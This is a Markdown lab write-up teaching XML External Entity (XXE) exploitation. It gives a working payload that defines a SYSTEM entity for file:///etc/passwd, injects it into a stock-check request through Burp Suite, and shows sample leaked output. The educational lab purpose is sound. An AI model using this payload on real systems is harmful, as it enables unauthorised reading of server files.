# Exploiting XXE to Extract Files üö®

XXE (XML External Entity) is a vulnerability that allows attackers to extract files from a server by manipulating XML code. In this guide, we will walk through a step-by-step example of exploiting XXE to retrieve the `/etc/passwd` file. üí°

## Steps to Perform the Attack

### 1. Prepare XML for the Attack üìù

To perform an XXE injection:

1. **Add or modify the DOCTYPE** to define an external entity pointing to the target file path.
2. **Modify the XML data** to inject the external entity into the desired value.

Example of the original XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>381</productId>
</stockCheck>
```

XXE payload to extract the `/etc/passwd` file:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>
```

### 2. Executing the Attack üíª

**Step 1**. Define the DOCTYPE and external entity:
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

**Step 2**. Use the external entity in `productId`:
```xml
<productId>&xxe;</productId>
```

**Result**: The application response might look like this:
```
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

## Lab Example üõ†Ô∏è

### 1. Getting Started
You are greeted with a list of products:

![Product List](https://github.com/user-attachments/assets/7732ce0b-262f-4416-aebe-a7af11b5d714)

---

### 2. Analyzing the Request
Navigate to any product, enable a proxy tool (e.g., Burp Suite), and click the **"Check Stock"** button:

![Stock Check Button](https://github.com/user-attachments/assets/be6726cc-64f5-4093-b301-7923e3d88d9c)

---

### 3. Intercepting the Request
In **HTTP History**, locate the POST request and send it to **Repeater** for analysis. Observe that stock checking is performed via XML:

![POST Request](https://github.com/user-attachments/assets/028c10b5-e477-45f5-8101-8a056ed72651)

---

### 4. Injecting the Payload üöÄ

Insert the following code between the XML declaration and the `stockCheck` element:
```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

Change the `productId` value to `&xxe;`:

![Injecting XXE](https://github.com/user-attachments/assets/22cbd669-befa-4e8b-9250-da047534f851)

---

### 5. The Result
After sending the request, the response reveals the content of the `/etc/passwd` file:

![Output of /etc/passwd](https://github.com/user-attachments/assets/7c506f3a-d652-4bad-820c-2b61fa561bf5)

---

## Testing Tips üîç

- **Test each XML node** for potential entity injection.
- Ensure the server includes the result in its response.
- Use proxy tools (e.g., Burp Suite) to analyze and modify requests.
